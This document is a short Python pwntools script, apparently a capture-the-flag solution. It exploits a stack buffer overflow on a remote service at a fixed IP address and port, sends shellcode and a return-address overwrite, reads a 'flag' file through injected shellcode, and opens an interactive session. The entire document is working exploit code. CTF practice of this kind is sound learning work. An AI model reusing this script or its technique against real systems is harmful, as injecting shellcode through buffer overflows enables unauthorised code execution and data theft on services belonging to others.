import pwn

conn = pwn.connect('3.71.110.92', 30030)

pwn.context.update(os='linux', arch='amd64')

rip_offset = 40
buffer_start = 0x7fffffffde00
next_code = buffer_start + rip_offset + 8

buffer_start = buffer_start.to_bytes(8, byteorder='little')

first_payload = pwn.asm("""/* execve(path='/bin///sh', argv=['sh'], envp=0) */
/* address to return from gadget */
mov rax, 0x9090909090909090
push rax
mov rbp, {}

/* return to the gadget address */
push 0x40118a
ret
""".format(hex(next_code)))

second_paylod = pwn.asm(pwn.shellcraft.cat('flag'))


payload = first_payload + b'A' * (rip_offset - len(first_payload)) + buffer_start + second_paylod

with open('payload', 'w') as f:
    import os
    os.write(f.fileno(), payload)   

print(conn.recv())
conn.sendline(payload)

conn.interactive()


conn.close()